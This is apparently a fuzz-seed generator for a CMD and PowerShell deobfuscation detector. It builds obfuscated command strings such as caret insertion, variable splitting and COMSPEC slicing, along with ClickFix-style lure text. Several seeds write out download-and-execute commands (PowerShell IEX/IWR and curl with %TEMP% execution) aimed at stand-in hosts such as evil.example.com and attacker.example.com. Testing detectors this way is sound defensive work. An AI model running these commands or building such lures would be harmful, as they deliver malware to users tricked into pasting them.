'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/cmd-grammar.js — deterministic seed generator for CMD + PowerShell
// obfuscation (the cmd-obfuscation.js + ps-mini-evaluator.js surfaces).
//
// The `cmd-obfuscation.js` finder emits both CMD-flavoured and PowerShell-
// flavoured candidates — the two interleave in real droppers and the post-
// processor treats them uniformly. The separate `powershell-obfuscation`
// target exists so the per-technique table can attribute PowerShell hits
// cleanly; this module covers the CMD surface only (plus the ClickFix
// wrapper, which is CMD-shaped).
//
// Each seed is a Buffer whose `_expectedSubstring` (attached via
// `makeSeed`) names a token that MUST appear in the decoder's
// `candidate.deobfuscated` output. The fuzz target asserts presence as a
// soft counter — a regression in decoding surfaces as `expectedMiss++`
// on the per-technique JSONL dump, not as a hard crash.
// ════════════════════════════════════════════════════════════════════════════

const CMD_TECHNIQUE_CATALOG = Object.freeze([
  'CMD Caret Insertion',
  'CMD Caret Insertion (nested)',
  'CMD Variable Concatenation',
  'CMD Delayed-Expansion Indirection',
  // "Env Var Substring" has four source sites in the decoder:
  // inline (welded into a word), and line-level resolved / partial /
  // structural (fired from the 3+-token resolver on a separate line).
  'CMD Env Var Substring (inline)',
  'CMD Env Var Substring',
  'CMD Env Var Substring (partial)',
  'CMD Env Var Substring (structural)',
  'CMD Env Var (argv0)',
  // "for /f" indirect execution — the CMD-specific pattern of piping
  // dynamic output into a callable (`for /f %i in ('…') do call %i`).
  'CMD for /f Indirect Execution',
  'CMD for /f Indirect Execution (partial)',
  'CMD for /f Indirect Execution (structural)',
  'CMD ClickFix Wrapper',
]);

// Tiny xorshift32 PRNG — deterministic per seed, no Math.random.
function makeRng(seed) {
  let s = (seed | 0) || 0xC1D5EED0;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Branch generators ──────────────────────────────────────────────────────
// Keep each one small; variety comes from parameter sweeps, not branch logic.

function genCaretInsertion(rng) {
  // Inject carets between letters of a sensitive keyword. Count varies
  // so nested (`^^`) and simple (`^`) both fire.
  const keywords = ['powershell', 'whoami', 'certutil', 'rundll32', 'mshta', 'regsvr32', 'bitsadmin'];
  const out = [];
  for (const kw of keywords) {
    // Simple caret insertion
    const letters = kw.split('');
    const withCarets = letters.join('^');
    out.push(makeSeed(`cmd /c ${withCarets} -Command "Get-Process"`, kw));
    // Nested double-caret form (for /f indirection)
    const doubled = letters.join('^^');
    out.push(makeSeed(`for /f "delims=" %X in ('echo ${doubled}') do %X`, kw));
    // Variable prefix/suffix carets
    const carets = '^'.repeat(1 + rng.int(3));
    out.push(makeSeed(`echo ${carets}${withCarets}${carets} args`, kw));
  }
  return out;
}

function genVariableConcat(rng) {
  // set a=pow & set b=ershell & %a%%b% - the canonical CMD var-split.
  const out = [];
  const targets = ['powershell', 'whoami', 'calc.exe', 'netstat'];
  for (const tgt of targets) {
    const splits = [];
    // Split the target into 2-4 pieces at random boundaries
    const pieces = 2 + rng.int(3);
    const positions = [];
    for (let i = 1; i < pieces; i++) positions.push(1 + rng.int(tgt.length - 1));
    positions.sort((a, b) => a - b);
    positions.unshift(0);
    positions.push(tgt.length);
    const parts = [];
    for (let i = 0; i < positions.length - 1; i++) {
      parts.push(tgt.slice(positions[i], positions[i + 1]));
    }
    const names = parts.map((_, i) => `v${i}`);
    for (let i = 0; i < parts.length; i++) {
      splits.push(`set ${names[i]}=${parts[i]}`);
    }
    const invoke = names.map(n => `%${n}%`).join('');
    out.push(makeSeed(splits.join('&&') + ' && ' + invoke, tgt));
  }
  return out;
}

function genDelayedExpansion() {
  // setlocal enabledelayedexpansion + !var! / !%VAR%! indirection.
  //
  // Two distinct decoder branches fire here:
  //   • The `!x!` form exercises the line-level variable-concatenation
  //     resolver (emits "CMD Variable Concatenation").
  //   • The mixed `!%VAR%!` form specifically targets the delayed-
  //     expansion indirection regex `/(?:!%([\w^]+)%!){2,}/` in
  //     `src/decoders/cmd-obfuscation.js` — which requires AT LEAST
  //     TWO adjacent mixed tokens to fire.
  return [
    makeSeed(
      'setlocal enabledelayedexpansion\nset x=powershell\n!x! -Command "whoami"',
      'powershell',
    ),
    makeSeed(
      'setlocal enabledelayedexpansion & set cmd=calc.exe & !cmd!',
      'calc.exe',
    ),
    // Delayed-expansion INDIRECTION — two adjacent !%VAR%! tokens.
    // Resolves to 'powershell' which trips SENSITIVE_CMD_KEYWORDS.
    makeSeed(
      'setlocal enabledelayedexpansion\n'
      + 'set A=power\nset B=shell\n'
      + 'cmd /c !%A%!!%B%!',
      'powershell',
    ),
    // Three-way indirection — exercises the {2,} quantifier's inner
    // iteration and the vname lookup fallthrough.
    makeSeed(
      'setlocal enabledelayedexpansion\n'
      + 'set P=pow\nset Q=er\nset R=shell\n'
      + '!%P%!!%Q%!!%R%! /c whoami',
      'powershell',
    ),
  ];
}

function genEnvVarSubstring() {
  // %COMSPEC:~N,M% — slice known env vars to reconstruct LOLBin tokens.
  // The decoder's KNOWN_ENV_VARS table maps COMSPEC → `C:\\Windows\\System32\\cmd.exe`
  // (27 chars). Offsets into that string:
  //   positions 11–16 → "System"
  //   positions 20–22 → "cmd"
  //   positions 24–26 → "exe"
  //   last 4 chars    → ".exe"
  const out = [];
  // Slice out "cmd" from COMSPEC (at offset 20, length 3).
  out.push(makeSeed('%COMSPEC:~20,3% /c whoami', 'cmd'));
  // Slice out ".exe"
  out.push(makeSeed('echo %COMSPEC:~-4%', '.exe'));
  // Slice "System" from COMSPEC
  out.push(makeSeed('%COMSPEC:~11,6%', 'System'));
  // Combined several slices — positions 20,3 + 22,1 = "cmd" + "d" = "cmdd"
  out.push(makeSeed(
    'set f=%COMSPEC:~20,3%%COMSPEC:~22,1%',
    'cmdd',
  ));
  return out;
}

function genArgv0() {
  // CMD Env Var (argv0) — bare `%COMSPEC%` / `%SystemRoot%\System32\cmd.exe`
  // in argv0 position. The decoder (cmd-obfuscation.js ~line 400)
  // recognises ONLY `COMSPEC` / `SYSTEMROOT` / `WINDIR` here and
  // additionally requires the tail to contain ` /x` or ` -x`
  // (switch-style argument) — otherwise the bare var is interpreted
  // as a documentation echo and suppressed.
  //
  // (The prior seed emitted `%~f0` / `%~nx0` — batch-script
  // self-reference syntax — which is a different concept the finder
  // doesn't model.)
  return [
    makeSeed('%COMSPEC% /c whoami', 'cmd.exe'),
    makeSeed(
      '%SystemRoot%\\System32\\cmd.exe /c powershell -NoP -C "whoami"',
      'cmd.exe',
    ),
    // After a `&` separator — argv0 regex anchors at line-start OR
    // after `&&` / `&` / `|` / `||` / `(` / `)`.
    makeSeed(
      'echo starting & %COMSPEC% /c curl http://evil.example.com/x',
      'cmd.exe',
    ),
    // Caret-split var name — the decoder strips carets before the
    // COMSPEC / SYSTEMROOT match.
    makeSeed(
      '%Co^m^s^p^ec% /c whoami',
      'cmd.exe',
    ),
  ];
}

function genClickFix() {
  // ClickFix = "Run dialog" social-engineering wrapper: user is told
  // to paste a line into Win+R. The finder in cmd-obfuscation.js
  // requires ALL THREE of:
  //   (a) a delivery vector — any sensitive CMD/PS decode candidate;
  //   (b) a ClickFix cue phrase — Win+R / Ctrl+V / paste / captcha
  //       / "I'm not a robot" / "click to verify" (CLICKFIX_CUES);
  //   (c) a trailing `echo "…"` with ≥3 consecutive spaces in the
  //       quoted body (trailingEchoRe) — the hallmark of lure-page
  //       payloads that embed a `echo '   ✓ Verification complete'`
  //       to hide the pasted command below the visible scroll.
  //
  // The previous seeds satisfied (a) + (b) but lacked (c), so the
  // 3-of-3 gate never fired.
  return [
    makeSeed(
      '# Press Win+R then paste the following and press Enter\n'
      + 'powershell -NoP -Command "IEX(IWR https://evil.example.com/p.ps1)"\n'
      + 'echo "   ✓ Verification complete"',
      'powershell',
    ),
    makeSeed(
      'Verify you are human: Ctrl+V the command into Windows Run dialog:\n'
      + 'cmd /c curl http://attacker.example.com/x -o %TEMP%\\x.exe && %TEMP%\\x.exe\n'
      + 'echo "    Please wait while we verify your browser   "',
      'curl',
    ),
    makeSeed(
      'I\'m not a robot — paste below:\n'
      + 'powershell.exe -NoP -W Hidden -C "& { IEX (IWR -UseB http://e.example/p) }"\n'
      + 'echo "      Loading captcha …      "',
      'powershell',
    ),
  ];
}

function generateCmdSeeds() {
  const rng = makeRng(0xC1D5EED0);
  return [
    ...genCaretInsertion(rng),
    ...genVariableConcat(rng),
    ...genDelayedExpansion(),
    ...genEnvVarSubstring(),
    ...genArgv0(),
    ...genClickFix(),
  ];
}

module.exports = { generateCmdSeeds, CMD_TECHNIQUE_CATALOG };
